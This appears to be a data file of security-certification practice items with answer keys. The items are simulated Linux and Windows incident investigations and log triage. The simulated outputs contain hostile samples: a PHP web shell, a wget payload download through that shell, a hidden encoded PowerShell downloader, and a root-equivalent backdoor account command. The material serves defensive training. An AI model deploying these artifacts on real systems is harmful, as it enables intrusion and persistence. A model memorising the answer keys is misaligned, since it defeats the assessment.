// PBQ — Retake set: command-line investigations, log triage, network builds, policy/document review.
// All hosts, IPs (RFC 5737 documentation ranges) and names are fictional.
PBQ.add([
// ======================= COMMAND LINE =======================
{
  id: "cli-linux-webshell", domain: 4, time: 7, type: "grid", level: "hard",
  title: "CLI: Investigate a compromised Linux web server",
  scenario: `<p>The SOC flagged outbound traffic from <b>web01</b> (Ubuntu, nginx + PHP) to an unknown address. You have a root shell. Use the terminal to investigate, then answer the questions below.</p>
  <p class="muted">Tip: start with <code>help</code>. Try network connections, processes, scheduled tasks, and the web logs.</p>`,
  term: {
    prompt: "root@web01:~#",
    intro: "Connected to web01. Type 'help' to list available commands.",
    cmds: {
      "whoami": "root",
      "ss -tunap|netstat -tunap|netstat -tulpn|ss -tulpn|netstat -anp": `Netid State   Local Address:Port   Peer Address:Port     Process
tcp   LISTEN  0.0.0.0:22           0.0.0.0:*             users:(("sshd",pid=812))
tcp   LISTEN  0.0.0.0:443          0.0.0.0:*             users:(("nginx",pid=1044))
tcp   LISTEN  0.0.0.0:31337        0.0.0.0:*             users:(("kworkerd",pid=3312))
tcp   ESTAB   10.1.1.10:443        192.0.2.15:52011      users:(("nginx",pid=1045))
tcp   ESTAB   10.1.1.10:48722      198.51.100.66:4444    users:(("kworkerd",pid=3312))`,
      "ps aux|ps -ef|ps": `USER       PID  %CPU COMMAND
root         1   0.0 /sbin/init
root       812   0.0 /usr/sbin/sshd -D
root      1044   0.0 nginx: master process /usr/sbin/nginx
www-data  1045   0.1 nginx: worker process
www-data  1102   0.0 php-fpm: pool www
www-data  3312  71.4 /tmp/.x/kworkerd -c 198.51.100.66:4444
root      3390   0.0 bash`,
      "ls -la /tmp/.x|ls /tmp/.x": `total 2124
drwxr-xr-x  2 www-data www-data    4096 Nov 12 09:14 .
-rwxr-xr-x  1 www-data www-data 2162688 Nov 12 09:14 kworkerd
-rwxr-xr-x  1 www-data www-data      88 Nov 12 09:15 cron.sh`,
      "cat /tmp/.x/cron.sh": `#!/bin/sh
pgrep kworkerd >/dev/null || /tmp/.x/kworkerd -c 198.51.100.66:4444 &`,
      "crontab -l -u www-data|crontab -u www-data -l": `* * * * * /tmp/.x/cron.sh`,
      "crontab -l": `no crontab for root`,
      "ls -la /var/www/html/uploads|ls /var/www/html/uploads": `-rw-r--r-- 1 www-data www-data  48213 Nov 01 10:02 logo.png
-rw-r--r-- 1 www-data www-data  91022 Nov 03 15:40 brochure.pdf
-rw-r--r-- 1 www-data www-data    112 Nov 12 09:11 shell.php`,
      "cat /var/www/html/uploads/shell.php": `<?php system($_GET['cmd']); ?>`,
      "tail /var/log/nginx/access.log|cat /var/log/nginx/access.log": `192.0.2.15    - [12/Nov 09:02:10] "GET / HTTP/1.1" 200
203.0.113.77  - [12/Nov 09:10:58] "GET /upload.php HTTP/1.1" 200
203.0.113.77  - [12/Nov 09:11:03] "POST /upload.php HTTP/1.1" 200   (file=shell.php)
203.0.113.77  - [12/Nov 09:11:20] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200
203.0.113.77  - [12/Nov 09:14:02] "GET /uploads/shell.php?cmd=wget+http://198.51.100.66/k+-O+/tmp/.x/kworkerd HTTP/1.1" 200
203.0.113.77  - [12/Nov 09:15:30] "GET /uploads/shell.php?cmd=crontab+... HTTP/1.1" 200
192.0.2.15    - [12/Nov 09:20:44] "GET /products HTTP/1.1" 200`,
      "tail /var/log/auth.log|cat /var/log/auth.log": `Nov 12 08:01:12 web01 sshd[812]: Accepted publickey for deploy from 10.99.0.20
Nov 12 09:30:05 web01 sshd[3388]: Accepted publickey for root from 10.99.0.20`,
      "sha256sum /tmp/.x/kworkerd": `9b1e4f0c2a7d...e31c  /tmp/.x/kworkerd   (matches known cryptominer/backdoor family on threat intel feed)`,
      "cat /etc/passwd|tail /etc/passwd": `root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
deploy:x:1001:1001::/home/deploy:/bin/bash`
    }
  },
  task: "Answer each item based on your investigation.",
  cols: ["Answer"],
  opts: [[""]],
  rowOpts: {
    0: ["203.0.113.77","198.51.100.66","192.0.2.15","10.99.0.20"],
    1: ["198.51.100.66","203.0.113.77","192.0.2.15","10.99.0.20"],
    2: ["3312","1044","812","1102"],
    3: ["Unrestricted file upload leading to a web shell","SSH brute force","Phishing email","SQL injection"],
    4: ["Cron job for www-data running cron.sh every minute","Systemd service","Run key in the registry","New SSH key for root"],
    5: ["kill -9 3312","rm -rf /var/www","shutdown -h now","systemctl restart nginx"],
    6: ["Remove","Keep"], 7: ["Remove","Keep"], 8: ["Remove","Keep"], 9: ["Remove","Keep"], 10: ["Remove","Keep"],
    11: ["Validate file type and store uploads outside the web root with no execute permission","Change the SSH port","Disable HTTPS","Add more RAM"]
  },
  rows: [
    { l: "Attacker IP that gained initial access", a: ["203.0.113.77"], w: "The access log shows this IP uploading shell.php and then running commands through it." },
    { l: "Command-and-control (C2) IP", a: ["198.51.100.66"], w: "kworkerd keeps an ESTABLISHED connection to 198.51.100.66:4444 and downloaded its binary from there." },
    { l: "PID of the malicious process", a: ["3312"], w: "A fake 'kworkerd' running from /tmp as www-data with high CPU. Real kernel workers don't live in /tmp." },
    { l: "Initial attack vector", a: ["Unrestricted file upload leading to a web shell"], w: "upload.php accepted a .php file, and the server then executed it from /uploads." },
    { l: "Persistence mechanism", a: ["Cron job for www-data running cron.sh every minute"], w: "crontab -l -u www-data shows the restart script." },
    { l: "First command to stop the active threat", a: ["kill -9 3312"], w: "Stop the process. (Isolating the host on the network is also valid; it isn't offered here.)" },
    { l: "/tmp/.x/kworkerd", a: ["Remove"], w: "The malicious binary." },
    { l: "/tmp/.x/cron.sh", a: ["Remove"], w: "The persistence script. Also remove the www-data crontab entry." },
    { l: "/var/www/html/uploads/shell.php", a: ["Remove"], w: "The web shell (the entry point)." },
    { l: "/var/www/html/uploads/brochure.pdf", a: ["Keep"], w: "A legitimate upload from before the attack." },
    { l: "/usr/sbin/nginx", a: ["Keep"], w: "The legitimate web server binary." },
    { l: "Fix to prevent a recurrence", a: ["Validate file type and store uploads outside the web root with no execute permission"], w: "Fix the root cause: the upload function." }
  ],
  explain: "Investigation flow: connections (ss/netstat) → process (ps) → file location → persistence (cron) → logs to find the entry point. Remove the binary, the persistence, AND the entry point (the web shell), then fix the vulnerable upload function."
},
{
  id: "cli-windows-malware", domain: 4, time: 7, type: "grid", level: "hard",
  title: "CLI: Find the malware on a Windows workstation",
  scenario: `<p>A user on <b>FIN-PC22</b> reports the PC is slow and the bank website "looks different." You have an elevated Command Prompt. Investigate, then answer the questions below.</p>`,
  term: {
    prompt: "C:\\Windows\\system32>",
    intro: "Microsoft Windows [Version 10.0.22631]  —  type 'help' for available commands.",
    cmds: {
      "netstat -ano|netstat -an|netstat -anob": `  Proto  Local Address        Foreign Address        State         PID
  TCP    0.0.0.0:135          0.0.0.0:0              LISTENING     1012
  TCP    0.0.0.0:445          0.0.0.0:0              LISTENING     4
  TCP    10.20.4.22:51544     10.20.0.10:445         ESTABLISHED   4
  TCP    10.20.4.22:51602     198.51.100.23:443      ESTABLISHED   4120
  TCP    10.20.4.22:51610     192.0.2.52:443          ESTABLISHED   6684`,
      "tasklist": `Image Name                     PID Session Name   Mem Usage
========================= ======== ============== ============
System                           4 Services            144 K
svchost.exe                   1012 Services         21,400 K
explorer.exe                  5520 Console          88,212 K
msedge.exe                    6684 Console         212,004 K
svchost.exe                   4120 Console         96,330 K
OneDrive.exe                  7012 Console          40,116 K`,
      "wmic process where processid=4120 get executablepath,commandline|wmic process where processid=4120 get commandline|wmic process where processid=4120 get executablepath": `CommandLine                                         ExecutablePath
"C:\\Users\\Public\\svchost.exe" -k netsvc             C:\\Users\\Public\\svchost.exe`,
      "wmic process where processid=1012 get executablepath": `ExecutablePath
C:\\Windows\\system32\\svchost.exe`,
      "reg query hkcu\\software\\microsoft\\windows\\currentversion\\run": `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    OneDrive    REG_SZ    "C:\\Users\\akim\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background
    Updater     REG_SZ    C:\\Users\\Public\\svchost.exe -k netsvc`,
      "schtasks /query /fo list|schtasks /query": `TaskName:      \\MicrosoftEdgeUpdateTaskMachineCore
Task To Run:   "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe" /c

TaskName:      \\OneDriveSyncHelper
Task To Run:   powershell.exe -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADMALwBzACcAKQA=
   (decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/s'))`,
      "type c:\\windows\\system32\\drivers\\etc\\hosts": `# Copyright (c) Microsoft Corp.
127.0.0.1       localhost
203.0.113.50    www.examplebank.com
203.0.113.50    login.examplebank.com`,
      "dir c:\\users\\public": ` Directory of C:\\Users\\Public
11/10/2026  08:42 AM    <DIR>          Documents
11/12/2026  09:02 AM         1,204,224 svchost.exe
11/12/2026  09:02 AM               412 invoice_viewer.lnk`,
      "ipconfig /displaydns": `    www.examplebank.com
    ----------------------------------------
    Record Name . . . . . : www.examplebank.com
    A (Host) Record . . . : 203.0.113.50   (source: hosts file)`,
      "whoami": "fin-pc22\\akim"
    }
  },
  task: "Answer each item based on your investigation.",
  cols: ["Answer"],
  opts: [[""]],
  rowOpts: {
    0: ["4120","1012","4","6684"],
    1: ["It runs from C:\\Users\\Public instead of C:\\Windows\\System32","It uses port 135","It runs in the Services session","It uses too little memory"],
    2: ["198.51.100.23","10.20.0.10","192.0.2.52","203.0.113.50"],
    3: ["Pharming (hosts file redirect)","DNS cache poisoning on the resolver","Typosquatting","SSL stripping"],
    4: ["Remove","Keep"], 5: ["Remove","Keep"], 6: ["Remove","Keep"], 7: ["Remove","Keep"], 8: ["Remove","Keep"],
    9: ["taskkill /PID 4120 /F","taskkill /PID 1012 /F","shutdown /s","del C:\\Windows\\system32\\svchost.exe"],
    10: ["Isolate the host, then reset the user's banking and domain credentials","Reboot and continue working","Only clear the browser cache","Disable Windows Update"]
  },
  rows: [
    { l: "PID of the malicious process", a: ["4120"], w: "svchost.exe in the user's Console session, beaconing to an external IP." },
    { l: "Why is that svchost.exe suspicious?", a: ["It runs from C:\\Users\\Public instead of C:\\Windows\\System32"], w: "Masquerading: a legitimate process name in the wrong path. Compare it with PID 1012." },
    { l: "C2 server", a: ["198.51.100.23"], w: "PID 4120's connection, and the encoded PowerShell downloads from the same IP." },
    { l: "What explains the bank site 'looking different'?", a: ["Pharming (hosts file redirect)"], w: "The hosts file points the bank's domain names at 203.0.113.50. That's a local redirect, not a poisoned resolver." },
    { l: "C:\\Users\\Public\\svchost.exe", a: ["Remove"], w: "The malware binary." },
    { l: "Run key 'Updater'", a: ["Remove"], w: "Persistence that starts at logon." },
    { l: "Scheduled task '\\OneDriveSyncHelper'", a: ["Remove"], w: "Persistence: hidden, encoded PowerShell that downloads from the C2. The name imitates a legitimate task." },
    { l: "hosts entries for examplebank.com", a: ["Remove"], w: "Restore the default hosts file." },
    { l: "Run key 'OneDrive'", a: ["Keep"], w: "A legitimate OneDrive autostart from the expected path." },
    { l: "Command to stop the malware now", a: ["taskkill /PID 4120 /F"], w: "Killing PID 1012 would stop a legitimate system service." },
    { l: "Next step after cleanup", a: ["Isolate the host, then reset the user's banking and domain credentials"], w: "The credentials may have been captured on the fake site. Isolate and investigate before returning the PC to service." }
  ],
  explain: "On Windows, check netstat -ano → tasklist → process path (wmic) → persistence (Run keys, scheduled tasks, services) → the hosts file. Masquerading process names and encoded PowerShell are classic indicators."
},
{
  id: "cli-network-diag", domain: 2, time: 6, type: "grid", level: "hard",
  title: "CLI: Diagnose a network-level attack",
  scenario: `<p>Several users on the <b>10.30.0.0/24</b> office subnet report certificate warnings and slow browsing since this morning. The real gateway is <b>10.30.0.1</b> and the approved DNS servers are <b>10.30.0.53</b> and <b>10.30.0.54</b>. You're on an affected Windows laptop.</p>`,
  term: {
    prompt: "C:\\Users\\tech>",
    intro: "Type 'help' to list available commands.",
    cmds: {
      "ipconfig /all": `Ethernet adapter Ethernet:
   IPv4 Address. . . . . . . . . . . : 10.30.0.117
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.30.0.1
   DHCP Server . . . . . . . . . . . : 10.30.0.250
   DNS Servers . . . . . . . . . . . : 10.30.0.250
   Lease Obtained. . . . . . . . . . : Saturday, November 14, 2026 7:58:02 AM`,
      "arp -a": `Interface: 10.30.0.117 --- 0x7
  Internet Address      Physical Address      Type
  10.30.0.1             a4-5e-60-12-9c-01     dynamic
  10.30.0.53            00-15-5d-01-02-53     dynamic
  10.30.0.250           a4-5e-60-12-9c-01     dynamic`,
      "nslookup portal.example.com": `Server:  UnKnown
Address:  10.30.0.250

Non-authoritative answer:
Name:    portal.example.com
Address:  203.0.113.99`,
      "nslookup portal.example.com 10.30.0.53": `Server:  dc1.example.com
Address:  10.30.0.53

Name:    portal.example.com
Address:  10.30.10.20`,
      "tracert 8.8.8.8|tracert -d 8.8.8.8": `  1     1 ms    1 ms    1 ms  10.30.0.250
  2     2 ms    2 ms    2 ms  10.30.0.1
  3    11 ms   10 ms   12 ms  192.0.2.1
  ...`,
      "ping 10.30.0.1": `Reply from 10.30.0.1: bytes=32 time=3ms TTL=128`,
      "netstat -rn|route print": `IPv4 Route Table
  0.0.0.0          0.0.0.0        10.30.0.1     10.30.0.117     25`
    }
  },
  task: "Answer each item based on your investigation.",
  cols: ["Answer"],
  opts: [[""]],
  rowOpts: {
    0: ["10.30.0.250","10.30.0.1","10.30.0.53","203.0.113.99"],
    1: ["Rogue DHCP server handing out a malicious DNS server","Legitimate DHCP failover","An expired DHCP lease","IP address conflict on the laptop"],
    2: ["ARP poisoning (on-path) of the gateway address","MAC flooding","VLAN hopping","Normal proxy ARP"],
    3: ["DNS spoofing via the rogue DNS server","Typosquatting","Hosts file pharming","DNSSEC failure on the real DNS"],
    4: ["arp -a","ipconfig /all","tracert","nslookup"],
    5: ["nslookup <name> <dns server>","ping","netstat -ano","arp -d"],
    6: ["tracert","arp -a","ipconfig /release","hostname"],
    7: ["DHCP snooping + Dynamic ARP Inspection on the switches","Disable DNS","Change the gateway IP","Remove all ARP entries manually every hour"]
  },
  rows: [
    { l: "Attacker-controlled host", a: ["10.30.0.250"], w: "It's acting as the DHCP and DNS server, and it shares the gateway's MAC address. That makes it the on-path box." },
    { l: "How did clients get the bad DNS server?", a: ["Rogue DHCP server handing out a malicious DNS server"], w: "The DHCP server should be the infrastructure server, not 10.30.0.250." },
    { l: "What does the ARP table show?", a: ["ARP poisoning (on-path) of the gateway address"], w: "Two IPs (gateway and 10.30.0.250) share one MAC, so traffic to the gateway flows through the attacker. tracert confirms it as the first hop." },
    { l: "Why does portal.example.com resolve differently?", a: ["DNS spoofing via the rogue DNS server"], w: "The real DNS (10.30.0.53) returns the internal IP. The rogue server returns an external IP, which explains the certificate warnings." },
    { l: "Command that shows IP-to-MAC mappings", a: ["arp -a"], w: "Displays the ARP cache." },
    { l: "Command to query a SPECIFIC DNS server", a: ["nslookup <name> <dns server>"], w: "Comparing answers from different servers isolates DNS tampering." },
    { l: "Command that shows the path packets take", a: ["tracert"], w: "An unexpected first hop reveals on-path devices." },
    { l: "Best switch-level prevention", a: ["DHCP snooping + Dynamic ARP Inspection on the switches"], w: "DHCP snooping blocks rogue DHCP servers. DAI validates ARP against the snooping table." }
  ],
  explain: "Know the core tools: ipconfig/ifconfig (local config), arp (IP↔MAC), nslookup/dig (DNS), tracert/traceroute (path), netstat/ss (connections), ping (reachability). A rogue DHCP server plus ARP poisoning gives an attacker a full on-path position."
},
{
  id: "cli-linux-bruteforce", domain: 4, time: 6, type: "grid", level: "hard",
  title: "CLI: SSH brute force and backdoor accounts",
  scenario: `<p>A Linux file server <b>files02</b> is exposed to the internet on SSH for a vendor. The SIEM shows an authentication spike overnight. Investigate with the terminal.</p>`,
  term: {
    prompt: "admin@files02:~$",
    intro: "Type 'help' to list available commands. (sudo is permitted.)",
    cmds: {
      "sudo tail /var/log/auth.log|sudo cat /var/log/auth.log|tail /var/log/auth.log": `Nov 14 02:10:01 files02 sshd[2201]: Failed password for backup from 203.0.113.10 port 51122
Nov 14 02:10:02 files02 sshd[2203]: Failed password for backup from 203.0.113.10 port 51124
   ... 3,912 similar lines for user backup from 203.0.113.10 ...
Nov 14 02:41:17 files02 sshd[6120]: Accepted password for backup from 203.0.113.10 port 60118
Nov 14 02:42:03 files02 sudo:   backup : COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M sysupdate
Nov 14 02:42:20 files02 sudo:   backup : COMMAND=/usr/bin/tee -a /home/backup/.ssh/authorized_keys
Nov 14 06:55:40 files02 sshd[7001]: Accepted publickey for admin from 10.99.0.20`,
      "sudo lastb|lastb|sudo lastb | head": `backup   ssh:notty    203.0.113.10   Sat Nov 14 02:41 - 02:41  (00:00)
backup   ssh:notty    203.0.113.10   Sat Nov 14 02:41 - 02:41  (00:00)
(3,912 failed attempts, all from 203.0.113.10)`,
      "last|last -a": `admin    pts/0   10.99.0.20    Sat Nov 14 06:55   still logged in
backup   pts/1   203.0.113.10   Sat Nov 14 02:41 - 03:20  (00:39)
vendor   pts/0   192.0.2.80    Thu Nov 12 14:00 - 14:30  (00:30)`,
      "cat /etc/passwd|tail /etc/passwd": `root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
backup:x:1002:1002::/home/backup:/bin/bash
vendor:x:1003:1003::/home/vendor:/bin/bash
sysupdate:x:0:0::/root:/bin/bash`,
      "sudo cat /home/backup/.ssh/authorized_keys|cat /home/backup/.ssh/authorized_keys": `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...x7Q backup@nas-legacy
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ...9pZ kali@attacker`,
      "grep ':0:' /etc/passwd|awk -f: '$3==0' /etc/passwd": `root:x:0:0:root:/root:/bin/bash
sysupdate:x:0:0::/root:/bin/bash`,
      "sudo grep passwordauthentication /etc/ssh/sshd_config|grep passwordauthentication /etc/ssh/sshd_config": `PasswordAuthentication yes`
    }
  },
  task: "Answer each item.",
  cols: ["Answer"],
  opts: [[""]],
  rowOpts: {
    0: ["203.0.113.10","10.99.0.20","192.0.2.80","127.0.0.1"],
    1: ["Brute force","Password spraying","Credential stuffing","Pass-the-hash"],
    2: ["backup","admin","vendor","root"],
    3: ["sysupdate (UID 0)","vendor","admin","www-data"],
    4: ["The kali@attacker key in backup's authorized_keys","The backup@nas-legacy key","admin's SSH session","The vendor account"],
    5: ["Remove","Keep"], 6: ["Remove","Keep"], 7: ["Disable / reset","Keep as-is"],
    8: ["Disable SSH password authentication (keys only), restrict SSH by source IP, and add fail2ban/lockout","Change SSH to port 2222 only","Increase password length for the backup account only","Turn off logging"]
  },
  rows: [
    { l: "Attacking IP", a: ["203.0.113.10"], w: "Thousands of failures followed by a success, all from this IP." },
    { l: "Attack type", a: ["Brute force"], w: "One account, thousands of passwords. Spraying would be many accounts with a few passwords." },
    { l: "Compromised account", a: ["backup"], w: "'Accepted password for backup' at 02:41." },
    { l: "Backdoor account created", a: ["sysupdate (UID 0)"], w: "useradd -o -u 0 created a second root-equivalent account. Always check for UID 0 duplicates." },
    { l: "Additional persistence", a: ["The kali@attacker key in backup's authorized_keys"], w: "The attacker appended their key so they can log in even after a password reset." },
    { l: "Account 'sysupdate'", a: ["Remove"], w: "Unauthorized root-equivalent account." },
    { l: "Key 'kali@attacker'", a: ["Remove"], w: "Attacker's persistence key." },
    { l: "Account 'backup'", a: ["Disable / reset"], w: "Its password is known to the attacker. Reset it, review its sudo rights, and only then re-enable it." },
    { l: "Best hardening going forward", a: ["Disable SSH password authentication (keys only), restrict SSH by source IP, and add fail2ban/lockout"], w: "Moving to a non-standard port is obscurity, not a control." }
  ],
  explain: "After any compromise, look for persistence beyond the obvious: new accounts (especially UID 0), SSH authorized_keys, cron jobs, and sudoers changes. Resetting the password alone leaves the attacker's key in place."
},
{
  id: "cli-file-integrity", domain: 1, time: 4, type: "grid", level: "medium",
  title: "CLI: Verify downloaded files before deployment",
  scenario: `<p>You downloaded three installers from a vendor mirror. The vendor's signed release page lists these SHA-256 values:</p>
  <pre class="log">agent-5.2.1.msi     4f2a9c...b81d
collector-3.0.tar   a1c7e0...09fe
updater-1.4.exe     7d33b1...c4a2</pre>`,
  term: {
    prompt: "PS C:\\Downloads>",
    intro: "Type 'help' to list available commands.",
    cmds: {
      "get-filehash agent-5.2.1.msi|get-filehash .\\agent-5.2.1.msi|certutil -hashfile agent-5.2.1.msi sha256": `Algorithm  Hash            Path
SHA256     4F2A9C...B81D   C:\\Downloads\\agent-5.2.1.msi`,
      "get-filehash collector-3.0.tar|get-filehash .\\collector-3.0.tar|certutil -hashfile collector-3.0.tar sha256": `Algorithm  Hash            Path
SHA256     A1C7E0...09FE   C:\\Downloads\\collector-3.0.tar`,
      "get-filehash updater-1.4.exe|get-filehash .\\updater-1.4.exe|certutil -hashfile updater-1.4.exe sha256": `Algorithm  Hash            Path
SHA256     E90B44...17AA   C:\\Downloads\\updater-1.4.exe`,
      "get-authenticodesignature updater-1.4.exe|get-authenticodesignature .\\updater-1.4.exe": `SignerCertificate  Status         Path
                   NotSigned      updater-1.4.exe`,
      "get-authenticodesignature agent-5.2.1.msi|get-authenticodesignature .\\agent-5.2.1.msi": `SignerCertificate                          Status  Path
CN=Example Software Inc (valid, trusted)   Valid   agent-5.2.1.msi`,
      "get-filehash agent-5.2.1.msi -algorithm md5": `Algorithm  Hash                              Path
MD5        0C9E...44D1                       C:\\Downloads\\agent-5.2.1.msi`
    }
  },
  task: "Answer each item.",
  cols: ["Answer"],
  opts: [[""]],
  rowOpts: {
    0: ["Integrity verified — deploy","Tampered or corrupted — do not deploy"],
    1: ["Integrity verified — deploy","Tampered or corrupted — do not deploy"],
    2: ["Integrity verified — deploy","Tampered or corrupted — do not deploy"],
    3: ["Hashing proves integrity; a valid code signature also proves the publisher (authenticity)","Hashing encrypts the file","A matching MD5 is stronger than SHA-256","Signing hides the file contents"],
    4: ["The hash on the vendor's page could be swapped by the same attacker if the page isn't signed/HTTPS","Hashes can't be compared","SHA-256 is reversible","PowerShell can't hash files"]
  },
  rows: [
    { l: "agent-5.2.1.msi", a: ["Integrity verified — deploy"], w: "The hash matches and the Authenticode signature is valid." },
    { l: "collector-3.0.tar", a: ["Integrity verified — deploy"], w: "The hash matches the published value." },
    { l: "updater-1.4.exe", a: ["Tampered or corrupted — do not deploy"], w: "The hash doesn't match AND the file is unsigned. Treat it as malicious and report the mirror." },
    { l: "Hash vs. code signature", a: ["Hashing proves integrity; a valid code signature also proves the publisher (authenticity)"], w: "A hash shows the file wasn't changed. A signature shows who published it." },
    { l: "Why get the hash from the vendor's official signed page, not the mirror?", a: ["The hash on the vendor's page could be swapped by the same attacker if the page isn't signed/HTTPS"], w: "Compromise the mirror and the hash next to it is compromised too." }
  ],
  explain: "Commands to know: Get-FileHash / certutil -hashfile (Windows), sha256sum (Linux). Compare against a TRUSTED source, and prefer signed code."
},

// ======================= LOG TRIAGE =======================
{
  id: "triage-hosts", domain: 4, time: 6, type: "grid", level: "hard",
  title: "Log triage: Clean, infected, or origin?",
  scenario: `<p>A ransomware precursor was detected. Review the combined EDR, firewall, and AV log for the morning, then classify every host. <b>Origin</b> = the first host compromised (patient zero).</p>`,
  log: `09:02:11 WS-01  EDR  winword.exe opened invoice_8812.docm (from email attachment)
09:02:14 WS-01  EDR  winword.exe -> powershell.exe -enc JABjAD0A... (child process)
09:02:20 WS-01  FW   ALLOW 10.20.4.31 -> 198.51.100.40:443  (new domain, first seen today)
09:15:47 WS-01  FW   ALLOW 10.20.4.31 -> 10.20.4.44:445 (SMB)
09:15:49 WS-01  FW   ALLOW 10.20.4.31 -> 10.20.4.57:445 (SMB)
09:15:52 WS-04  EDR  New service created: "WinUpdSvc" C:\\Windows\\Temp\\wu.exe (remote creation by 10.20.4.31)
09:16:05 WS-04  FW   ALLOW 10.20.4.44 -> 198.51.100.40:443
09:15:53 WS-07  AV   BLOCKED + QUARANTINED C:\\Windows\\Temp\\wu.exe (pushed from 10.20.4.31). No process started.
09:31:10 WS-12  EDR  PsExec service started, source 10.20.4.44
09:31:22 WS-12  FW   ALLOW 10.20.4.88 -> 198.51.100.40:443 (beacon every 60s)
09:40:00 FS-01  OS   Scheduled backup job completed successfully
09:41:13 WS-09  FW   DENY  10.20.4.91 -> 198.51.100.40:443 (category: known C2)  x1, user clicked same email link; no process events
Host IPs: WS-01=10.20.4.31  WS-04=10.20.4.44  WS-07=10.20.4.57  WS-12=10.20.4.88  WS-09=10.20.4.91  FS-01=10.20.0.10`,
  task: "Classify each host, then answer the follow-ups.",
  cols: ["Classification"],
  opts: [["Origin","Infected","Clean"]],
  rowOpts: {
    6: ["198.51.100.40","10.20.4.31","10.20.0.10","10.20.4.44"],
    7: ["Isolate WS-01, WS-04 and WS-12 from the network","Shut down the file server","Reimage WS-07","Block all SMB company-wide permanently"],
    8: ["Lateral movement over SMB/remote service creation (PsExec)","Phishing to each user separately","Worm via USB","DNS tunneling"]
  },
  rows: [
    { l: "WS-01", a: ["Origin"], w: "It opened the macro document, spawned encoded PowerShell, reached the C2 first, then pushed to others over SMB." },
    { l: "WS-04", a: ["Infected"], w: "A remote service was created from WS-01 and the host then beaconed to the C2. It also went on to infect WS-12." },
    { l: "WS-07", a: ["Clean"], w: "AV blocked and quarantined the payload before it ran, and there's no C2 traffic. Still verify it, but it's not infected." },
    { l: "WS-12", a: ["Infected"], w: "PsExec from WS-04, followed by regular 60-second beaconing." },
    { l: "WS-09", a: ["Clean"], w: "The C2 connection was denied, and no malicious process ran. The user does need awareness follow-up, though." },
    { l: "FS-01", a: ["Clean"], w: "Only routine backup activity." },
    { l: "C2 address to block everywhere", a: ["198.51.100.40"], w: "The common beacon destination." },
    { l: "Immediate containment", a: ["Isolate WS-01, WS-04 and WS-12 from the network"], w: "Contain every infected host, including the origin." },
    { l: "How did it spread?", a: ["Lateral movement over SMB/remote service creation (PsExec)"], w: "From WS-01 → WS-04 → WS-12." }
  ],
  explain: "Order the events by time. The origin is the first host with an execution event from outside (here, the email). 'Infected' needs evidence that something executed (a process, a service, beaconing). A blocked attempt, or a denied connection with no execution, is 'clean'."
},
{
  id: "triage-traffic", domain: 4, time: 5, type: "grid", level: "medium",
  title: "Log triage: Classify suspicious traffic",
  scenario: `<p>A NetFlow summary from the core firewall over 24 hours is below. Classify each host's behavior.</p>`,
  log: `SRC           DST                 PORT   PATTERN
10.5.0.21     198.51.100.7        443    1.2 KB every 60.0s exactly, 24h, same size
10.5.0.33     10.5.0.0/24         1-1024 2,048 SYNs to sequential ports in 40s, few replies
10.5.0.48     203.0.113.200       443    9.8 GB upload 02:10–03:40 to personal cloud storage
10.5.0.52     192.0.2.40           443    300 MB, business hours, Microsoft 365 traffic pattern
10.5.0.60     198.51.100.9        53     40,000 DNS TXT queries; long random subdomains of x7f3.example.net
10.5.0.71     10.5.0.10           3389   Admin jump host → server, business hours, change ticket CHG-4471`,
  task: "Classify each host.",
  cols: ["Behavior"],
  opts: [["C2 beaconing","Port scanning / reconnaissance","Data exfiltration","DNS tunneling","Normal / authorized"]],
  rows: [
    { l: "10.5.0.21", a: ["C2 beaconing"], w: "Fixed interval, fixed size, around the clock. Classic beaconing." },
    { l: "10.5.0.33", a: ["Port scanning / reconnaissance"], w: "Sequential SYNs across many ports with few replies." },
    { l: "10.5.0.48", a: ["Data exfiltration"], w: "A large upload at night to personal storage." },
    { l: "10.5.0.52", a: ["Normal / authorized"], w: "Expected SaaS traffic during work hours." },
    { l: "10.5.0.60", a: ["DNS tunneling"], w: "High volumes of TXT queries with random subdomains under one domain." },
    { l: "10.5.0.71", a: ["Normal / authorized"], w: "Approved admin access with a change ticket." }
  ],
  explain: "Regular timing points to beaconing. Many ports with few replies points to scanning. Volume plus odd hours plus an unusual destination points to exfiltration. Long random DNS subdomains point to tunneling. Always check for authorization (tickets, approved hosts) before calling something malicious."
},
{
  id: "triage-phish", domain: 4, time: 5, type: "grid", level: "medium",
  title: "Log triage: Phishing campaign response",
  scenario: `<p>A credential-phishing email went to 6 users. Combine the mail gateway, proxy, and IdP logs, then decide the status and action for each user.</p>`,
  log: `MAIL  09:01  delivered to: alee, bkhan, cdiaz, dmoss, eng, fpatel   subject "Payroll update required"
MAIL  09:06  fpatel clicked REPORT PHISH
PROXY 09:04  alee   GET  https://payro11-portal.example.net/login   200
PROXY 09:05  alee   POST https://payro11-portal.example.net/login   302
PROXY 09:09  cdiaz  GET  https://payro11-portal.example.net/login   200   (no POST)
PROXY 09:12  dmoss  GET  https://payro11-portal.example.net/login   200
PROXY 09:12  dmoss  POST https://payro11-portal.example.net/login   302
IDP   09:20  dmoss  sign-in SUCCESS from 203.0.113.61 (new country), MFA: approved push
IDP   09:21  alee   sign-in FAILED from 203.0.113.61, MFA: denied
(bkhan and eng: no proxy or IdP events)`,
  task: "Choose each user's status, then the actions.",
  cols: ["Status"],
  opts: [["Received only","Clicked (no credentials submitted)","Submitted credentials","Account compromised","Reported the phish"]],
  rowOpts: {
    6: ["Revoke sessions, reset password, re-register MFA, review mailbox rules for dmoss","Send dmoss a reminder email","Do nothing because MFA was used","Delete dmoss's account permanently"],
